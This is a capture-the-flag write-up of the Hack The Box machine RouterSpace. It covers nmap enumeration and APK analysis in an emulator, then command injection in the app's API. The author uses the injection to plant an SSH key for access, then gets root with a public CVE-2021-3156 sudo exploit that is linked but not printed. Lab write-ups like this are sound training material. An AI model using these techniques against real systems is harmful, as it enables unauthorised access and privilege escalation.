---
title: "HTB - RouterSpace"
classes: wide
tag: 
  - "OSCP Box"
  - "APK Reversing"
  - "Mobile Pentesting"
  - "Sudo Exploit"
header:
  teaser: /assets/images/htb/htb.png
ribbon: lawngreen
description: "Writeup for HTB - RouterSpace"
categories:
  - HTB
---

- [Hack The Box - RouterSpace](#hack-the-box---routerspace)
  - [Nmap scan](#nmap-scan)
  - [Enumeration](#enumeration)
  - [Gaining Foothold](#gaining-foothold)
  - [Privilege Escalation](#privilege-escalation)

## Nmap scan

Performing ```nmap``` scan on the target machine,

```c
┌──(kali㉿aidenpearce369)-[~]
└─$ nmap -sC -sV -A 10.10.11.148    
Starting Nmap 7.92 ( https://nmap.org ) at 2022-03-26 01:33 EDT
Nmap scan report for 10.10.11.148
Host is up (0.26s latency).
Not shown: 998 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     (protocol 2.0)
| fingerprint-strings: 
|   NULL: 
|_    SSH-2.0-RouterSpace Packet Filtering V1
| ssh-hostkey: 
|   3072 f4:e4:c8:0a:a6:af:66:93:af:69:5a:a9:bc:75:f9:0c (RSA)
|   256 7f:05:cd:8c:42:7b:a9:4a:b2:e6:35:2c:c4:59:78:02 (ECDSA)
|_  256 2f:d7:a8:8b:be:2d:10:b0:c9:b4:29:52:a8:94:24:78 (ED25519)
80/tcp open  http
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.1 200 OK
|     X-Powered-By: RouterSpace
|     X-Cdn: RouterSpace-29248
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 70
|     ETag: W/"46-xjHoLMGLNuwUgj+wfGrPgEMZdoI"
|     Date: Sat, 26 Mar 2022 05:37:44 GMT
|     Connection: close
|     Suspicious activity detected !!! {RequestID: v vb X6f ik5f m C D }
|   GetRequest: 
|     HTTP/1.1 200 OK
|     X-Powered-By: RouterSpace
|     X-Cdn: RouterSpace-54386
|     Accept-Ranges: bytes
|     Cache-Control: public, max-age=0
|     Last-Modified: Mon, 22 Nov 2021 11:33:57 GMT
|     ETag: W/"652c-17d476c9285"
|     Content-Type: text/html; charset=UTF-8
|     Content-Length: 25900
|     Date: Sat, 26 Mar 2022 05:37:42 GMT
|     Connection: close
|     <!doctype html>
|     <html class="no-js" lang="zxx">
|     <head>
|     <meta charset="utf-8">
|     <meta http-equiv="x-ua-compatible" content="ie=edge">
|     <title>RouterSpace</title>
|     <meta name="description" content="">
|     <meta name="viewport" content="width=device-width, initial-scale=1">
|     <link rel="stylesheet" href="css/bootstrap.min.css">
|     <link rel="stylesheet" href="css/owl.carousel.min.css">
|     <link rel="stylesheet" href="css/magnific-popup.css">
|     <link rel="stylesheet" href="css/font-awesome.min.css">
|     <link rel="stylesheet" href="css/themify-icons.css">
|   HTTPOptions: 
|     HTTP/1.1 200 OK
|     X-Powered-By: RouterSpace
|     X-Cdn: RouterSpace-59424
|     Allow: GET,HEAD,POST
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 13
|     ETag: W/"d-bMedpZYGrVt1nR4x+qdNZ2GqyRo"
|     Date: Sat, 26 Mar 2022 05:37:42 GMT
|     Connection: close
|     GET,HEAD,POST
|   RTSPRequest, X11Probe: 
|     HTTP/1.1 400 Bad Request
|_    Connection: close
|_http-title: RouterSpace
|_http-trane-info: Problem with XML parsing of /evox/about
2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port22-TCP:V=7.92%I=7%D=3/26%Time=623EA5AD%P=x86_64-pc-linux-gnu%r(NULL
SF:,29,"SSH-2\.0-RouterSpace\x20Packet\x20Filtering\x20V1\r\n");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port80-TCP:V=7.92%I=7%D=3/26%Time=623EA5AD%P=x86_64-pc-linux-gnu%r(GetR
SF:equest,31BA,"HTTP/1\.1\x20200\x20OK\r\nX-Powered-By:\x20RouterSpace\r\n
SF:X-Cdn:\x20RouterSpace-54386\r\nAccept-Ranges:\x20bytes\r\nCache-Control
SF::\x20public,\x20max-age=0\r\nLast-Modified:\x20Mon,\x2022\x20Nov\x20202
SF:1\x2011:33:57\x20GMT\r\nETag:\x20W/\"652c-17d476c9285\"\r\nContent-Type
SF::\x20text/html;\x20charset=UTF-8\r\nContent-Length:\x2025900\r\nDate:\x
SF:20Sat,\x2026\x20Mar\x202022\x2005:37:42\x20GMT\r\nConnection:\x20close\
SF:r\n\r\n<!doctype\x20html>\n<html\x20class=\"no-js\"\x20lang=\"zxx\">\n<
SF:head>\n\x20\x20\x20\x20<meta\x20charset=\"utf-8\">\n\x20\x20\x20\x20<me
SF:ta\x20http-equiv=\"x-ua-compatible\"\x20content=\"ie=edge\">\n\x20\x20\
SF:x20\x20<title>RouterSpace</title>\n\x20\x20\x20\x20<meta\x20name=\"desc
SF:ription\"\x20content=\"\">\n\x20\x20\x20\x20<meta\x20name=\"viewport\"\
SF:x20content=\"width=device-width,\x20initial-scale=1\">\n\n\x20\x20\x20\
SF:x20<link\x20rel=\"stylesheet\"\x20href=\"css/bootstrap\.min\.css\">\n\x
SF:20\x20\x20\x20<link\x20rel=\"stylesheet\"\x20href=\"css/owl\.carousel\.
SF:min\.css\">\n\x20\x20\x20\x20<link\x20rel=\"stylesheet\"\x20href=\"css/
SF:magnific-popup\.css\">\n\x20\x20\x20\x20<link\x20rel=\"stylesheet\"\x20
SF:href=\"css/font-awesome\.min\.css\">\n\x20\x20\x20\x20<link\x20rel=\"st
SF:ylesheet\"\x20href=\"css/themify-icons\.css\">\n\x20")%r(HTTPOptions,10
SF:8,"HTTP/1\.1\x20200\x20OK\r\nX-Powered-By:\x20RouterSpace\r\nX-Cdn:\x20
SF:RouterSpace-59424\r\nAllow:\x20GET,HEAD,POST\r\nContent-Type:\x20text/h
SF:tml;\x20charset=utf-8\r\nContent-Length:\x2013\r\nETag:\x20W/\"d-bMedpZ
SF:YGrVt1nR4x\+qdNZ2GqyRo\"\r\nDate:\x20Sat,\x2026\x20Mar\x202022\x2005:37
SF::42\x20GMT\r\nConnection:\x20close\r\n\r\nGET,HEAD,POST")%r(RTSPRequest
SF:,2F,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nConnection:\x20close\r\n\r\n
SF:")%r(X11Probe,2F,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nConnection:\x20
SF:close\r\n\r\n")%r(FourOhFourRequest,12C,"HTTP/1\.1\x20200\x20OK\r\nX-Po
SF:wered-By:\x20RouterSpace\r\nX-Cdn:\x20RouterSpace-29248\r\nContent-Type
SF::\x20text/html;\x20charset=utf-8\r\nContent-Length:\x2070\r\nETag:\x20W
SF:/\"46-xjHoLMGLNuwUgj\+wfGrPgEMZdoI\"\r\nDate:\x20Sat,\x2026\x20Mar\x202
SF:022\x2005:37:44\x20GMT\r\nConnection:\x20close\r\n\r\nSuspicious\x20act
SF:ivity\x20detected\x20!!!\x20{RequestID:\x20v\x20\x20vb\x20X6f\x20ik5f\x
SF:20m\x20C\x20\x20D\x20}\n\n");

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 55.19 seconds
```

Seems like there are only two service open, ```ssh``` and ```http```

## Enumeration

For ```ssh``` we don't know the credentials yet, so we can't use that

Lets start enumerating the webservice,

![Image](https://raw.githubusercontent.com/AidenPearce369/OSCP-HTB/main/RouterSpace/pics/1.png)

After visiting the web page, we could download an ```apk``` file from the home page

<center>
<img src="https://raw.githubusercontent.com/AidenPearce369/OSCP-HTB/main/RouterSpace/pics/2.png" style="width:40%">
</center>

Using ```apktool``` to decompress the ```apk``` file to view its contents

```c
┌──(kali㉿aidenpearce369)-[~/Downloads/RouterSpace]
└─$ ls
RouterSpace.apk
                                                                                                                                                             
┌──(kali㉿aidenpearce369)-[~/Downloads/RouterSpace]
└─$ apktool d RouterSpace.apk -o output
Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
I: Using Apktool 2.5.0-dirty on RouterSpace.apk
I: Loading resource table...
I: Decoding AndroidManifest.xml with resources...
I: Loading resource table from file: /home/kali/.local/share/apktool/framework/1.apk
I: Regular manifest package...
I: Decoding file-resources...
I: Decoding values */* XMLs...
I: Baksmaling classes.dex...
I: Copying assets and libs...
I: Copying unknown files...
I: Copying original files...
```

After analysing various strings, we could not find any useful information

Lets try running it on ```Genymotion```, which requires lot of proxy configuration inside it and we have to setup burp proxy to intercept the app requests

Checking the SDK version to run the app,

```c
┌──(kali㉿aidenpearce369)-[~/Downloads/RouterSpace/output]
└─$ grep -r "minSdk" .
./apktool.yml:  minSdkVersion: '21'
```

Installing the ```apk``` file to install it,

```c
┌──(aidenpearce369㉿ragnar)-[~/Downloads]
└─$ adb devices
List of devices attached
* daemon not running; starting now at tcp:5037
* daemon started successfully
emulator-5558	device

                                                                                                    
┌──(aidenpearce369㉿ragnar)-[~/Downloads]
└─$ adb install RouterSpace.apk 
Success
```

Adding our ```routerspace.htb``` into the hosts file of our emulator incase if it resolves hostname to IP for connection

```c
┌──(aidenpearce369㉿ragnar)-[~/Downloads]
└─$ adb -s 192.168.57.103:5555 root                                                             1 ⨯
adbd is already running as root
                                                                                                    
┌──(aidenpearce369㉿ragnar)-[~/Downloads]
└─$ adb -s 192.168.57.103:5555 remount
remount succeeded
                                                                                                    
┌──(aidenpearce369㉿ragnar)-[~/Downloads]
└─$ adb -s 192.168.57.103:5555 pull /system/etc/hosts
/system/etc/hosts: 1 file pulled. 0.1 MB/s (124 bytes in 0.001s)
                                                                                                    
┌──(aidenpearce369㉿ragnar)-[~/Downloads]
└─$ nano hosts 
                                                                                                    
┌──(aidenpearce369㉿ragnar)-[~/Downloads]
└─$ cat hosts 
127.0.0.1       localhost
::1             ip6-localhost
10.10.11.148    routerspace.htb
                                                                                                    
┌──(aidenpearce369㉿ragnar)-[~/Downloads]
└─$ adb -s 192.168.57.103:5555 push hosts /system/etc/hosts                                     1 ⨯
hosts: 1 file pushed. 0.0 MB/s (88 bytes in 0.006s)
```

<center>
<img src="https://raw.githubusercontent.com/AidenPearce369/OSCP-HTB/main/RouterSpace/pics/3.png" style="width:40%">
</center>

It should give output like this, while loading the added hostname

<center>
<img src="https://raw.githubusercontent.com/AidenPearce369/OSCP-HTB/main/RouterSpace/pics/4.png" style="width:40%">
</center>

While hitting the button on the app, we will intercept a request on burp proxy,

After sending the request to repeater, lets fuzz to find any vulnerability

![Image](https://raw.githubusercontent.com/AidenPearce369/OSCP-HTB/main/RouterSpace/pics/5.png)

Seems like it is validating the IP address, there may be a possible command injection

![Image](https://raw.githubusercontent.com/AidenPearce369/OSCP-HTB/main/RouterSpace/pics/6.png)


So ```command injection``` vulnerability exists

## Gaining Foothold

We have found the data passed into the API call has ```command injection```, using this lets try to gain foothold on this machine

Since we have SSH in running state, we can use it to spawn shell

Checking the home directory of user,

![Image](https://raw.githubusercontent.com/AidenPearce369/OSCP-HTB/main/RouterSpace/pics/7.png)

Formatting the data in ```python```,

```c
>>> data="0.0.0.0\n/opt/www/public/routerspace\ntotal 48\ndrwxr-xr-x 8 paul paul 4096 Feb 17 18:30 .\ndrwxr-xr-x 3 root root 4096 Feb 17 18:30 ..\nlrwxrwxrwx 1 root root    9 Nov 20 19:32 .bash_history -> /dev/null\n-rw-r--r-- 1 paul paul  220 Nov 20 17:32 .bash_logout\n-rw-r--r-- 1 paul paul 3771 Nov 20 17:32 .bashrc\ndrwx------ 2 paul paul 4096 Feb 17 18:30 .cache\ndrwx------ 2 paul paul 4096 Feb 17 18:30 .gnupg\ndrwxrwxr-x 3 paul paul 4096 Feb 17 18:30 .local\ndrwxrwxr-x 5 paul paul 4096 Mar 26 08:38 .pm2\n-rw-r--r-- 1 paul paul  823 Nov 20 18:30 .profile\ndrwxr-xr-x 3 paul paul 4096 Feb 17 18:30 snap\ndrwx------ 2 paul paul 4096 Feb 17 18:30 .ssh\n-r--r----- 1 root paul   33 Mar 26 08:39 user.txt\n"
>>> print(data)
0.0.0.0
/opt/www/public/routerspace
total 48
drwxr-xr-x 8 paul paul 4096 Feb 17 18:30 .
drwxr-xr-x 3 root root 4096 Feb 17 18:30 ..
lrwxrwxrwx 1 root root    9 Nov 20 19:32 .bash_history -> /dev/null
-rw-r--r-- 1 paul paul  220 Nov 20 17:32 .bash_logout
-rw-r--r-- 1 paul paul 3771 Nov 20 17:32 .bashrc
drwx------ 2 paul paul 4096 Feb 17 18:30 .cache
drwx------ 2 paul paul 4096 Feb 17 18:30 .gnupg
drwxrwxr-x 3 paul paul 4096 Feb 17 18:30 .local
drwxrwxr-x 5 paul paul 4096 Mar 26 08:38 .pm2
-rw-r--r-- 1 paul paul  823 Nov 20 18:30 .profile
drwxr-xr-x 3 paul paul 4096 Feb 17 18:30 snap
drwx------ 2 paul paul 4096 Feb 17 18:30 .ssh
-r--r----- 1 root paul   33 Mar 26 08:39 user.txt
```

There is a ```.ssh``` directory, if we get the private key of the user we can login into ```SSH``` or we can copy our public key into ```authorized_users``` to gain access

![Image](https://raw.githubusercontent.com/AidenPearce369/OSCP-HTB/main/RouterSpace/pics/8.png)

There is no private key/ authorized_users file

Creating a new set of keys to copy the public key into the ```authorized_users```

```c
┌──(kali㉿aidenpearce369)-[~]
└─$ ssh-keygen -t RSA -b 4096 -C "routerspace_pwn" -f "routerspace" -P ""
Generating public/private RSA key pair.
Your identification has been saved in routerspace
Your public key has been saved in routerspace.pub
The key fingerprint is:
SHA256:gdB43xYOccaMZozuVI5b60W3BsSel92H2r0Bi3lDxfI routerspace_pwn
The key's randomart image is:
+---[RSA 4096]----+
|    .o o.*o   .  |
|    ..+.Bo*  . o |
|     o.B.* o o+o |
|      + +.O +ooEo|
|     o oS+ +++o..|
|      o . .o++...|
|       . . .. . o|
|        .      . |
|                 |
+----[SHA256]-----+
                                                                                                                                                             
┌──(kali㉿aidenpearce369)-[~]
└─$ cat routerspace.pub 
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQCkn0gavw760MrVDvMxbI2b6BNzDs/YOjqOC9euTaa5GFwsLN+QDIWMyfD9sWqR2IqmuhjIDkHnSKFJAo/LazaiBVStnhJ6Zflq0/C3oMDDyV6tkTBdxuCEnlhcRcUIy4DHEvqGQ8YRGCxquO8/QpI1GKbpfi8ffLmp/KDbapkTU20x+ibLQGHzvaF4YbE5KzR1yP5gSAEzx569Gd2bVbApqTiLDQi6CdiFQDc2JwNMF5p6Jircf/Vwb9OGEerPWHHmOrgZnKkqJU6QxJOhVWIBA0bwuGx9G1p1eHi8u6WHmNBJjMuPKmnXFWWcTUsmVk5r0MTSRxiSF1SJiynWRbXLkeN4p5+rc6h0MGwrwewWPbbevaRDD44sBmnq9xat/0IK6iDoYnwEp7bMiOsIcWlavabadFCQsX2GE7mgct+HhAG4E76NupdKddfOvcxk3MUaqD8BfPA/C3BLs9DGSeuo7VtLu56yelTzJjjZPZgFtUxQHrneaGFm+JFXgKH+FLi8SsxVCYjLdAJ5u0i1Cc+XlMEuDtbtcMsD7kvd9lsqSzCGuFnRcu4Meaqec6t1PoJHouNfGxqPE4B6AbdW2x7T/yOXJ/SL58M528uWEkKvcm69yxSlcS4yeYsvK9eekjM6wnUEo5PB+CjhnuGTYmb3QdE20Jkd06aJrEcG/S4Djw== routerspace_pwn
```

Copying it into the file,

![Image](https://raw.githubusercontent.com/AidenPearce369/OSCP-HTB/main/RouterSpace/pics/9.png)

Now spawning the ```SSH``` shell to gain initial access,

```c
┌──(kali㉿aidenpearce369)-[~]
└─$ ssh -i routerspace paul@10.10.11.148                                 
The authenticity of host '10.10.11.148 (10.10.11.148)' can't be established.
ED25519 key fingerprint is SHA256:iwHQgWKu/VDyjka2Y4j2V8P2Rk6K13HuNT4JTnITIDk.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.11.148' (ED25519) to the list of known hosts.
Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-90-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sat 26 Mar 2022 10:20:19 AM UTC

  System load:           0.0
  Usage of /:            70.7% of 3.49GB
  Memory usage:          17%
  Swap usage:            0%
  Processes:             213
  Users logged in:       0
  IPv4 address for eth0: 10.10.11.148
  IPv6 address for eth0: dead:beef::250:56ff:feb9:be15

 * Super-optimized for small spaces - read how we shrank the memory
   footprint of MicroK8s to make it the smallest full K8s around.

   https://ubuntu.com/blog/microk8s-memory-optimisation

80 updates can be applied immediately.
31 of these updates are standard security updates.
To see these additional updates run: apt list --upgradable


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Sat Nov 20 18:30:35 2021 from 192.168.150.133
paul@routerspace:~$ id
uid=1001(paul) gid=1001(paul) groups=1001(paul)
paul@routerspace:~$ whoami
paul
paul@routerspace:~$ cat user.txt 
<USER FLAG>
```

## Privilege Escalation

After enumerating for standard privilege escalation technqiues, still there is no lead

And there was some ```firewall rules``` too, so that I could not copy files from my file server of remote machine

Lets try ```scp```,

```c
┌──(kali㉿aidenpearce369)-[~]
└─$ chmod +x linpeas.sh 
                                                                                 
┌──(kali㉿aidenpearce369)-[~]
└─$ scp -i ~/routerspace  linpeas.sh  paul@10.10.11.148:/home/paul/linpeas.sh
linpeas.sh                                     100%  758KB 181.1KB/s   00:04 

```

Running ```linpeas.sh```,

```c
paul@routerspace:~$ ls
linpeas.sh  snap  user.txt
paul@routerspace:~$ ./linpeas.sh 

...

╔══════════╣ Operative system
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#kernel-exploits                                                                                
Linux version 5.4.0-90-generic (buildd@lgw01-amd64-054) (gcc version 9.3.0 (Ubuntu 9.3.0-17ubuntu1~20.04)) #101-Ubuntu SMP Fri Oct 15 20:00:55 UTC 2021      
Distributor ID: Ubuntu
Description:    Ubuntu 20.04.3 LTS
Release:        20.04
Codename:       focal

╔══════════╣ Sudo version
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-version                                                                                   
Sudo version 1.8.31                                                                                                                                          
...

```

Here ```sudo``` version is less that ```1.28```

```c
paul@routerspace:~$ uname -a
Linux routerspace.htb 5.4.0-90-generic #101-Ubuntu SMP Fri Oct 15 20:00:55 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux
paul@routerspace:~$ sudo -V
Sudo version 1.8.31
Sudoers policy plugin version 1.8.31
Sudoers file grammar version 46
Sudoers I/O plugin version 1.8.31
```

Referring to this [exploit](https://github.com/mohinparamasivam/Sudo-1.8.31-Root-Exploit)

Using ```searchsploit```,

```c
┌──(kali㉿aidenpearce369)-[~]
└─$ searchsploit sudo                     

...

Sudo 1.9.5p1 - 'Baron Samedit ' Heap-Based Buffer Overflow Privilege Escalation (1)                                        | multiple/local/49521.py
Sudo 1.9.5p1 - 'Baron Samedit ' Heap-Based Buffer Overflow Privilege Escalation (2)                                        | multiple/local/49522.c

...

```

But none of these work here, some of them are unstable and some requires ```malicious /etc/passwd``` file to make this exploit work

This [exploit](https://raw.githubusercontent.com/worawit/CVE-2021-3156/main/exploit_nss.py) works without any dependencies in ```python```

Now we can easily spawn ```root shell``` by crafting malicious ```/etc/passwd``` file,

```c
paul@routerspace:~$ nano sudo-exploit.py
paul@routerspace:~$ python3 sudo-exploit.py 
# id
uid=0(root) gid=0(root) groups=0(root),1001(paul)
# whoami
root
# cd /
# cd root
# ls    
root.txt
# cat root.txt
<ROOT FLAG>
```
